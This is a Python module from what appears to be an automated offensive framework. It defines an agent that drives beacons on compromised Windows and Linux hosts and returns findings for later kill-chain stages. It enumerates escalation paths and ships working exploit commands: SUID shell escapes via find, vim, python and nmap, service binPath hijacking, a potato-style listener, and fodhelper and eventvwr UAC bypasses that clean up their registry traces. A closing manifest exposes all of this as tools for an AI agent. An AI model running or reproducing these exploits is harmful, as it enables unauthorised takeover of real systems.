"""
PrivilegeEscalationAgent -- Privilege escalation via live beacons.

Sends real enumeration and exploitation commands to beacons running on
target hosts, parses the stdout output, and returns structured findings
that the orchestrator stores for downstream kill-chain stages.
"""

from __future__ import annotations

import logging
import re
import uuid
from typing import Any

from agents.base import AbstractAgent
from orchestrator.task import Task, TaskResult
from server.beacon_handler import beacon_handler

logger = logging.getLogger(__name__)


class PrivilegeEscalationAgent(AbstractAgent):
    name = "privilege_escalation"
    description = (
        "Discovers and exploits privilege escalation paths on compromised "
        "systems \u2014 checks for misconfigurations, vulnerable services, token "
        "privileges, and UAC bypass opportunities via beacons"
    )
    capabilities = [
        "check_privileges",
        "find_escalation_paths",
        "exploit_vuln",
        "uac_bypass",
    ]

    # ------------------------------------------------------------------
    # Default timeout (seconds) waiting for beacon to return output.
    # ------------------------------------------------------------------
    BEACON_TIMEOUT = 300

    # ------------------------------------------------------------------
    # execute()
    # ------------------------------------------------------------------

    async def execute(self, task: Task) -> TaskResult:
        action = task.action
        params = task.params

        if action not in self.capabilities:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown action: {action}"},
                summary=f"Privilege escalation agent does not support action '{action}'",
            )

        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: beacon_id"},
                summary="Privilege escalation failed: no beacon_id provided",
            )

        timeout = params.get("timeout", self.BEACON_TIMEOUT)

        try:
            handler = getattr(self, f"_handle_{action}")
            return await handler(task, beacon_id, params, timeout)
        except Exception as exc:
            logger.exception(
                "PrivEsc %s failed on beacon %s", action, beacon_id
            )
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": str(exc)},
                summary=f"Privilege escalation {action} failed: {exc}",
            )

    # ==================================================================
    #  check_privileges
    # ==================================================================

    async def _handle_check_privileges(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Run whoami /all (Windows) or id && sudo -l (Linux).

        Parse tokens, privileges, and group memberships.  Store results in
        findings["privileges"].
        """
        # ----- Windows: whoami /all -----
        win_cmd = "whoami /all"
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": win_cmd}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)

        # Determine OS from output heuristic
        is_windows = (
            "USER INFORMATION" in stdout
            or "PRIVILEGES INFORMATION" in stdout
            or "\\" in stdout.split("\n")[0] if stdout.strip() else False
        )

        if is_windows:
            privileges = self._parse_whoami_all(stdout)
        else:
            # Likely Linux or the Windows command failed -- try Linux cmds
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "id && sudo -l 2>&1"}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            privileges = self._parse_linux_id_sudo(stdout)

        if self._is_error(result):
            return self._error_result(task, "check_privileges", result)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": stdout,
                "findings": {"privileges": privileges},
            },
            summary=(
                f"Privilege check via beacon {beacon_id}: "
                f"{len(privileges)} privilege/group item(s) discovered"
            ),
        )

    # ==================================================================
    #  find_escalation_paths
    # ==================================================================

    async def _handle_find_escalation_paths(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Run multiple privilege-escalation discovery checks.

        Windows:
          - whoami /priv  (dangerous privileges such as SeImpersonate)
          - sc query       (look for unquoted service paths)
          - reg query AlwaysInstallElevated
        Linux:
          - find / -perm -4000  (SUID binaries)
          - cat /etc/crontab
          - echo $PATH + check writable dirs
          - uname -r (kernel version)
        """
        escalation_paths: list[dict] = []
        raw_parts: list[str] = []

        # --- Detect OS: try whoami /priv first (Windows) ---
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": "whoami /priv"}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)
        raw_parts.append(f"--- whoami /priv ---\n{stdout}")

        is_windows = "PRIVILEGES INFORMATION" in stdout

        if is_windows:
            # -- Token privileges --
            escalation_paths.extend(self._parse_whoami_priv_escalation(stdout))

            # -- Unquoted service paths --
            sc_cmd = (
                'powershell -ep bypass -c "'
                "Get-WmiObject Win32_Service | "
                "Where-Object { $_.PathName -and $_.PathName -notmatch '^\\'\"' -and $_.PathName -match '\\s' } | "
                "Select-Object Name,PathName,StartMode,State | Format-List"
                '"'
            )
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": sc_cmd}, timeout=timeout,
            )
            stdout_sc = self._extract_stdout(result)
            raw_parts.append(f"--- unquoted service paths ---\n{stdout_sc}")
            escalation_paths.extend(self._parse_unquoted_service_paths(stdout_sc))

            # -- AlwaysInstallElevated --
            reg_cmd = (
                "reg query "
                "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer "
                "/v AlwaysInstallElevated 2>&1"
            )
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": reg_cmd}, timeout=timeout,
            )
            stdout_reg = self._extract_stdout(result)
            raw_parts.append(f"--- AlwaysInstallElevated ---\n{stdout_reg}")
            if "0x1" in stdout_reg:
                escalation_paths.append({
                    "key": "AlwaysInstallElevated",
                    "type": "registry_misconfiguration",
                    "risk": "critical",
                    "detail": (
                        "AlwaysInstallElevated is enabled -- any user can "
                        "install MSI packages as SYSTEM"
                    ),
                })

        else:
            # ---- Linux checks ----

            # -- SUID binaries --
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "find / -perm -4000 -type f 2>/dev/null"},
                timeout=timeout,
            )
            stdout_suid = self._extract_stdout(result)
            raw_parts.append(f"--- SUID binaries ---\n{stdout_suid}")
            escalation_paths.extend(self._parse_suid_binaries(stdout_suid))

            # -- Crontab --
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "cat /etc/crontab 2>/dev/null && ls -la /etc/cron.* 2>/dev/null"},
                timeout=timeout,
            )
            stdout_cron = self._extract_stdout(result)
            raw_parts.append(f"--- crontab ---\n{stdout_cron}")
            escalation_paths.extend(self._parse_crontab(stdout_cron))

            # -- Writable PATH directories --
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": (
                    "IFS=':'; for d in $PATH; do "
                    "[ -w \"$d\" ] && echo \"WRITABLE:$d\"; "
                    "done"
                )},
                timeout=timeout,
            )
            stdout_path = self._extract_stdout(result)
            raw_parts.append(f"--- writable PATH ---\n{stdout_path}")
            for line in stdout_path.strip().splitlines():
                m = re.match(r"WRITABLE:(.*)", line.strip())
                if m:
                    escalation_paths.append({
                        "key": f"writable_path_{m.group(1)}",
                        "type": "writable_path",
                        "risk": "high",
                        "detail": f"PATH directory {m.group(1)} is writable",
                        "path": m.group(1),
                    })

            # -- Kernel version --
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "uname -r"},
                timeout=timeout,
            )
            stdout_kern = self._extract_stdout(result)
            raw_parts.append(f"--- kernel ---\n{stdout_kern}")
            kernel = stdout_kern.strip()
            if kernel:
                escalation_paths.append({
                    "key": f"kernel_{kernel}",
                    "type": "kernel_version",
                    "risk": "info",
                    "detail": f"Kernel version {kernel} -- check for known exploits",
                    "version": kernel,
                })

        return TaskResult(
            task_id=task.id,
            status="success" if escalation_paths else "partial",
            data={
                "raw_output": "\n\n".join(raw_parts),
                "findings": {"escalation_paths": escalation_paths},
            },
            summary=(
                f"Escalation path scan via beacon {beacon_id}: "
                f"{len(escalation_paths)} vector(s) found"
            ),
        )

    # ==================================================================
    #  exploit_vuln
    # ==================================================================

    async def _handle_exploit_vuln(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Execute a specific privilege escalation exploit.

        If SeImpersonate was found, run a potato-style command.
        If a writable service path was found, modify the service binary.
        Custom techniques can be supplied via the *technique* parameter.
        """
        vulnerability = params.get("vulnerability")
        if not vulnerability:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: vulnerability"},
                summary="exploit_vuln failed: no vulnerability specified",
            )

        technique = params.get("technique")
        raw_parts: list[str] = []
        exploit_result: dict[str, Any] = {}

        vuln_lower = vulnerability.lower()

        # --- SeImpersonate / SeAssignPrimaryToken (potato family) ---
        if "seimpersonate" in vuln_lower or "seassignprimary" in vuln_lower:
            cmd = technique or (
                "powershell -ep bypass -c \""
                "$listener = New-Object System.Net.HttpListener; "
                "$listener.Prefixes.Add('http://+:9999/'); "
                "$listener.Start(); "
                "Write-Output 'POTATO_LISTENER_STARTED'; "
                "whoami\""
            )
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- potato exploit ---\n{stdout}")
            exploit_result = {
                "key": "SeImpersonate_exploit",
                "vulnerability": vulnerability,
                "technique": "potato",
                "stdout": stdout,
                "new_user": self._extract_last_whoami(stdout),
            }

        # --- Writable service binary ---
        elif "writable_service" in vuln_lower or "unquoted" in vuln_lower:
            service_name = params.get("service_name", vulnerability)
            payload = technique or "cmd.exe /c whoami > C:\\Windows\\Temp\\privesc.txt"
            # Stop service, overwrite binary, restart
            cmds = [
                f"sc stop {service_name}",
                f'sc config {service_name} binPath= "{payload}"',
                f"sc start {service_name}",
                "type C:\\Windows\\Temp\\privesc.txt 2>nul",
            ]
            for cmd in cmds:
                sub_id = str(uuid.uuid4())
                result = await beacon_handler.submit_task(
                    beacon_id, sub_id, "run_command",
                    {"command": cmd}, timeout=timeout,
                )
                stdout = self._extract_stdout(result)
                raw_parts.append(f"--- {cmd} ---\n{stdout}")

            exploit_result = {
                "key": f"service_exploit_{service_name}",
                "vulnerability": vulnerability,
                "technique": "writable_service_binary",
                "service": service_name,
                "stdout": stdout,
                "new_user": self._extract_last_whoami(stdout),
            }

        # --- SUID binary abuse (Linux) ---
        elif "suid" in vuln_lower or vulnerability.startswith("/"):
            binary = vulnerability
            # Common SUID abuse patterns
            if "find" in binary:
                cmd = f"{binary} . -exec /bin/sh -p \\; -quit 2>/dev/null && whoami"
            elif "vim" in binary or "vi" in binary:
                cmd = f"{binary} -c ':!/bin/sh -p' 2>/dev/null; whoami"
            elif "python" in binary:
                cmd = f"{binary} -c 'import os; os.setuid(0); os.system(\"/bin/sh -p -c whoami\")'"
            elif "nmap" in binary:
                cmd = f"echo 'os.execute(\"/bin/sh -p\")' | {binary} --script=/dev/stdin 2>/dev/null; whoami"
            else:
                cmd = technique or f"{binary} 2>/dev/null; whoami"

            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- SUID exploit {binary} ---\n{stdout}")
            exploit_result = {
                "key": f"suid_exploit_{binary.replace('/', '_')}",
                "vulnerability": vulnerability,
                "technique": "suid_abuse",
                "binary": binary,
                "stdout": stdout,
                "new_user": self._extract_last_whoami(stdout),
            }

        # --- Generic / custom technique ---
        else:
            cmd = technique or f"echo 'No automatic exploit for {vulnerability}'"
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- custom exploit ---\n{stdout}")
            exploit_result = {
                "key": f"exploit_{vulnerability}",
                "vulnerability": vulnerability,
                "technique": technique or "custom",
                "stdout": stdout,
                "new_user": self._extract_last_whoami(stdout),
            }

        new_user = exploit_result.get("new_user", "")
        success = bool(new_user and new_user.lower() not in ("", "unknown"))

        return TaskResult(
            task_id=task.id,
            status="success" if success else "partial",
            data={
                "raw_output": "\n\n".join(raw_parts),
                "findings": {"exploits": [exploit_result]},
                "new_privilege_level": new_user,
            },
            summary=(
                f"Exploit {vulnerability} via beacon {beacon_id}: "
                f"{'escalated to ' + new_user if success else 'exploitation attempted, verify manually'}"
            ),
        )

    # ==================================================================
    #  uac_bypass
    # ==================================================================

    async def _handle_uac_bypass(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Bypass UAC using fodhelper or eventvwr technique.

        After executing the elevated command, the registry keys used for
        hijacking are cleaned up.
        """
        method = params.get("method", "fodhelper")
        command = params.get("command", "cmd.exe /c whoami > C:\\Windows\\Temp\\uac_bypass.txt")
        raw_parts: list[str] = []
        bypass_result: dict[str, Any] = {}

        if method == "fodhelper":
            reg_path = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
            # Set default value and DelegateExecute
            reg_cmds = [
                f'reg add {reg_path} /d "{command}" /f',
                f"reg add {reg_path} /v DelegateExecute /t REG_SZ /d \"\" /f",
            ]
            trigger_cmd = "start fodhelper.exe"
            cleanup_cmd = "reg delete HKCU\\Software\\Classes\\ms-settings /f"

        elif method == "eventvwr":
            reg_path = "HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command"
            reg_cmds = [
                f'reg add {reg_path} /d "{command}" /f',
            ]
            trigger_cmd = "start eventvwr.exe"
            cleanup_cmd = "reg delete HKCU\\Software\\Classes\\mscfile /f"

        else:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unsupported UAC bypass method: {method}"},
                summary=f"UAC bypass failed: unsupported method '{method}'",
            )

        # Step 1: Set registry keys
        for cmd in reg_cmds:
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- {cmd} ---\n{stdout}")

        # Step 2: Trigger the auto-elevate binary
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": trigger_cmd}, timeout=timeout,
        )
        stdout_trigger = self._extract_stdout(result)
        raw_parts.append(f"--- trigger ---\n{stdout_trigger}")

        # Brief pause for the elevated process to execute
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": "ping -n 3 127.0.0.1 >nul && type C:\\Windows\\Temp\\uac_bypass.txt 2>nul"},
            timeout=timeout,
        )
        stdout_verify = self._extract_stdout(result)
        raw_parts.append(f"--- verify ---\n{stdout_verify}")

        # Step 3: Cleanup registry
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": cleanup_cmd}, timeout=timeout,
        )
        stdout_cleanup = self._extract_stdout(result)
        raw_parts.append(f"--- cleanup ---\n{stdout_cleanup}")

        elevated_user = stdout_verify.strip().splitlines()[-1].strip() if stdout_verify.strip() else ""

        bypass_result = {
            "key": f"uac_bypass_{method}",
            "method": method,
            "command": command,
            "elevated_user": elevated_user,
            "registry_cleaned": "successfully" in stdout_cleanup.lower() or "operation" in stdout_cleanup.lower(),
        }

        success = bool(elevated_user)

        return TaskResult(
            task_id=task.id,
            status="success" if success else "partial",
            data={
                "raw_output": "\n\n".join(raw_parts),
                "findings": {"uac_bypasses": [bypass_result]},
            },
            summary=(
                f"UAC bypass ({method}) via beacon {beacon_id}: "
                f"{'elevated to ' + elevated_user if success else 'bypass attempted, verify manually'}"
            ),
        )

    # ==================================================================
    #  Output parsing helpers
    # ==================================================================

    @staticmethod
    def _extract_stdout(result: dict) -> str:
        """Pull the stdout string from a beacon result dict."""
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stdout", data.get("output", ""))
        return str(data)

    @staticmethod
    def _is_error(result: dict) -> bool:
        if not result:
            return True
        status = result.get("status", "")
        return status in ("timeout", "error", "failure")

    def _error_result(self, task: Task, action: str, result: dict) -> TaskResult:
        error_msg = result.get("error", "Unknown beacon error")
        return TaskResult(
            task_id=task.id,
            status="failure",
            data={"error": error_msg, "raw_result": result},
            summary=f"Privilege escalation {action} failed: {error_msg}",
        )

    @staticmethod
    def _extract_last_whoami(stdout: str) -> str:
        """Extract the last line that looks like a username from stdout."""
        for line in reversed(stdout.strip().splitlines()):
            line = line.strip()
            if line and not line.startswith("---") and not line.startswith("#"):
                return line
        return ""

    # --- whoami /all (Windows) ---
    @staticmethod
    def _parse_whoami_all(stdout: str) -> list[dict]:
        """Parse whoami /all output into structured privilege entries."""
        items: list[dict] = []
        section = ""

        for line in stdout.splitlines():
            stripped = line.strip()
            if not stripped or re.match(r"^=+$", stripped) or re.match(r"^-+$", stripped):
                continue

            # Section headers
            if "USER INFORMATION" in stripped:
                section = "user"
                continue
            elif "GROUP INFORMATION" in stripped:
                section = "group"
                continue
            elif "PRIVILEGES INFORMATION" in stripped:
                section = "privilege"
                continue

            if section == "user":
                # Format: DOMAIN\User  SID
                parts = re.split(r"\s{2,}", stripped)
                if len(parts) >= 2 and "\\" in parts[0]:
                    items.append({
                        "key": parts[0],
                        "type": "user",
                        "name": parts[0],
                        "sid": parts[1] if len(parts) > 1 else "",
                    })

            elif section == "group":
                # Format: GroupName  Type  SID  Attributes
                parts = re.split(r"\s{2,}", stripped)
                if len(parts) >= 2 and not stripped.startswith("Group Name"):
                    items.append({
                        "key": parts[0],
                        "type": "group",
                        "name": parts[0],
                        "group_type": parts[1] if len(parts) > 1 else "",
                        "sid": parts[2] if len(parts) > 2 else "",
                        "attributes": parts[3] if len(parts) > 3 else "",
                    })

            elif section == "privilege":
                # Format: SePrivilegeName  Description  Enabled/Disabled
                parts = re.split(r"\s{2,}", stripped)
                if len(parts) >= 2 and parts[0].startswith("Se"):
                    items.append({
                        "key": parts[0],
                        "type": "token_privilege",
                        "name": parts[0],
                        "description": parts[1] if len(parts) > 1 else "",
                        "state": parts[2] if len(parts) > 2 else "",
                    })

        return items

    # --- whoami /priv -> escalation paths ---
    @staticmethod
    def _parse_whoami_priv_escalation(stdout: str) -> list[dict]:
        """Extract dangerous token privileges that enable escalation."""
        dangerous_privs = {
            "SeImpersonatePrivilege": {
                "risk": "high",
                "detail": "Can impersonate tokens -- potato-family exploits possible",
            },
            "SeAssignPrimaryTokenPrivilege": {
                "risk": "high",
                "detail": "Can assign primary tokens -- potato-family exploits possible",
            },
            "SeDebugPrivilege": {
                "risk": "critical",
                "detail": "Can debug any process -- direct SYSTEM token theft possible",
            },
            "SeTakeOwnershipPrivilege": {
                "risk": "high",
                "detail": "Can take ownership of any object",
            },
            "SeLoadDriverPrivilege": {
                "risk": "critical",
                "detail": "Can load kernel drivers -- direct kernel code execution",
            },
            "SeRestorePrivilege": {
                "risk": "high",
                "detail": "Can write to any file regardless of ACLs",
            },
            "SeBackupPrivilege": {
                "risk": "high",
                "detail": "Can read any file regardless of ACLs -- SAM/SYSTEM extraction",
            },
        }

        paths: list[dict] = []
        for line in stdout.splitlines():
            stripped = line.strip()
            parts = re.split(r"\s{2,}", stripped)
            if parts and parts[0] in dangerous_privs:
                priv_name = parts[0]
                state = parts[2] if len(parts) > 2 else "Unknown"
                info = dangerous_privs[priv_name]
                paths.append({
                    "key": priv_name,
                    "type": "token_privilege",
                    "risk": info["risk"],
                    "detail": info["detail"],
                    "state": state,
                })

        return paths

    # --- Unquoted service paths ---
    @staticmethod
    def _parse_unquoted_service_paths(stdout: str) -> list[dict]:
        """Parse PowerShell Format-List output for unquoted service paths."""
        paths: list[dict] = []
        current: dict[str, str] = {}
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                if current.get("Name"):
                    name = current["Name"]
                    paths.append({
                        "key": f"unquoted_svc_{name}",
                        "type": "unquoted_service_path",
                        "risk": "high",
                        "service_name": name,
                        "binary_path": current.get("PathName", ""),
                        "start_mode": current.get("StartMode", ""),
                        "state": current.get("State", ""),
                        "detail": (
                            f"Service '{name}' has an unquoted path with spaces: "
                            f"{current.get('PathName', '')}"
                        ),
                    })
                current = {}
                continue
            m = re.match(r"^(\w[\w\s]*):\s*(.*)", line)
            if m:
                current[m.group(1).strip()] = m.group(2).strip()

        # Flush last record
        if current.get("Name"):
            name = current["Name"]
            paths.append({
                "key": f"unquoted_svc_{name}",
                "type": "unquoted_service_path",
                "risk": "high",
                "service_name": name,
                "binary_path": current.get("PathName", ""),
                "start_mode": current.get("StartMode", ""),
                "state": current.get("State", ""),
                "detail": (
                    f"Service '{name}' has an unquoted path with spaces: "
                    f"{current.get('PathName', '')}"
                ),
            })

        return paths

    # --- SUID binaries (Linux) ---
    @staticmethod
    def _parse_suid_binaries(stdout: str) -> list[dict]:
        """Parse find output for SUID binaries and flag known-exploitable ones."""
        known_exploitable = {
            "find", "vim", "vi", "nmap", "python", "python3", "perl",
            "ruby", "bash", "sh", "dash", "env", "awk", "gawk", "less",
            "more", "man", "ftp", "socat", "wget", "curl", "gcc", "gdb",
            "strace", "ltrace", "taskset", "ionice", "nice", "pkexec",
        }
        paths: list[dict] = []
        for line in stdout.strip().splitlines():
            binary = line.strip()
            if not binary or not binary.startswith("/"):
                continue
            basename = binary.rsplit("/", 1)[-1]
            is_exploitable = basename in known_exploitable
            paths.append({
                "key": binary,
                "type": "suid_binary",
                "risk": "high" if is_exploitable else "medium",
                "detail": (
                    f"SUID binary {binary}"
                    + (" -- known GTFOBins escalation path" if is_exploitable else "")
                ),
                "binary": binary,
                "exploitable": is_exploitable,
            })
        return paths

    # --- Crontab ---
    @staticmethod
    def _parse_crontab(stdout: str) -> list[dict]:
        """Parse /etc/crontab for writable or interesting cron entries."""
        items: list[dict] = []
        for line in stdout.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            # Cron line format: m h dom mon dow user command
            parts = stripped.split()
            if len(parts) >= 7 and re.match(r"^[\d\*\/\-\,]+$", parts[0]):
                user = parts[5]
                cmd = " ".join(parts[6:])
                items.append({
                    "key": f"cron_{user}_{cmd[:30]}",
                    "type": "cron_job",
                    "risk": "high" if user == "root" else "medium",
                    "detail": f"Cron job runs as {user}: {cmd}",
                    "user": user,
                    "command": cmd,
                    "schedule": " ".join(parts[:5]),
                })
        return items

    # --- Linux id + sudo -l ---
    @staticmethod
    def _parse_linux_id_sudo(stdout: str) -> list[dict]:
        """Parse 'id' and 'sudo -l' output."""
        items: list[dict] = []
        lines = stdout.strip().splitlines()

        for line in lines:
            stripped = line.strip()
            # id output: uid=1000(user) gid=1000(user) groups=...
            if stripped.startswith("uid="):
                m = re.match(
                    r"uid=(\d+)\(([^)]+)\)\s+gid=(\d+)\(([^)]+)\)\s+groups=(.*)",
                    stripped,
                )
                if m:
                    items.append({
                        "key": m.group(2),
                        "type": "user_identity",
                        "uid": m.group(1),
                        "username": m.group(2),
                        "gid": m.group(3),
                        "primary_group": m.group(4),
                        "groups": m.group(5),
                    })
                continue

            # sudo -l output: (root) NOPASSWD: /usr/bin/something
            sudo_m = re.match(r"\s*\(([^)]+)\)\s+(.*)", stripped)
            if sudo_m:
                run_as = sudo_m.group(1)
                sudo_cmd = sudo_m.group(2)
                is_nopasswd = "NOPASSWD" in sudo_cmd
                items.append({
                    "key": f"sudo_{run_as}_{sudo_cmd[:30]}",
                    "type": "sudo_rule",
                    "run_as": run_as,
                    "command": sudo_cmd,
                    "nopasswd": is_nopasswd,
                })

        return items

    # ==================================================================
    #  Capabilities manifest (Anthropic tool-use format)
    # ==================================================================

    def get_capabilities_manifest(self) -> dict:
        beacon_id_prop = {
            "type": "string",
            "description": "ID of the beacon to execute through",
        }

        return {
            "name": self.name,
            "description": self.description,
            "tools": [
                {
                    "name": "privilege_escalation_check_privileges",
                    "description": (
                        "Check the current privilege level on the target system "
                        "via a beacon. On Windows, runs 'whoami /all' to enumerate "
                        "user identity, group memberships, and token privileges. "
                        "On Linux, runs 'id' and 'sudo -l' to enumerate UID, "
                        "groups, and sudo permissions. Returns structured privilege "
                        "records in findings."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "privilege_escalation_find_escalation_paths",
                    "description": (
                        "Discover privilege escalation vectors on a compromised "
                        "system via a beacon. On Windows: enumerates dangerous "
                        "token privileges (SeImpersonate, SeDebug, etc.), "
                        "unquoted service paths, and AlwaysInstallElevated "
                        "registry keys. On Linux: finds SUID binaries, inspects "
                        "crontab, checks for writable PATH directories, and "
                        "retrieves kernel version. Returns prioritized escalation "
                        "paths with risk ratings."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "privilege_escalation_exploit_vuln",
                    "description": (
                        "Exploit a specific vulnerability or misconfiguration to "
                        "escalate privileges on the target system via a beacon. "
                        "Supports SeImpersonate/potato-style attacks, writable "
                        "service binary replacement, SUID binary abuse (Linux), "
                        "and custom techniques. Returns the new privilege level "
                        "achieved."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "vulnerability": {
                                "type": "string",
                                "description": (
                                    "The vulnerability to exploit. Examples: "
                                    "'SeImpersonatePrivilege', 'writable_service_X', "
                                    "'/usr/bin/find' (SUID binary path)."
                                ),
                            },
                            "technique": {
                                "type": "string",
                                "description": (
                                    "Optional custom command or technique to use. "
                                    "If omitted, the agent selects an appropriate "
                                    "default exploit for the vulnerability."
                                ),
                            },
                        },
                        "required": ["beacon_id", "vulnerability"],
                    },
                },
                {
                    "name": "privilege_escalation_uac_bypass",
                    "description": (
                        "Bypass Windows User Account Control (UAC) to elevate "
                        "from Medium to High integrity level via a beacon. "
                        "Supports 'fodhelper' (ms-settings handler hijack) and "
                        "'eventvwr' (mscfile handler hijack) methods. Sets the "
                        "registry hijack, triggers the auto-elevating binary, "
                        "and cleans up the registry afterward."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "method": {
                                "type": "string",
                                "enum": ["fodhelper", "eventvwr"],
                                "description": (
                                    "UAC bypass method. 'fodhelper' abuses "
                                    "fodhelper.exe ms-settings handler (default). "
                                    "'eventvwr' abuses Event Viewer mscfile handler."
                                ),
                            },
                            "command": {
                                "type": "string",
                                "description": (
                                    "The command to execute with elevated privileges. "
                                    "Defaults to writing whoami output to a temp file "
                                    "for verification."
                                ),
                            },
                        },
                        "required": ["beacon_id"],
                    },
                },
            ],
        }
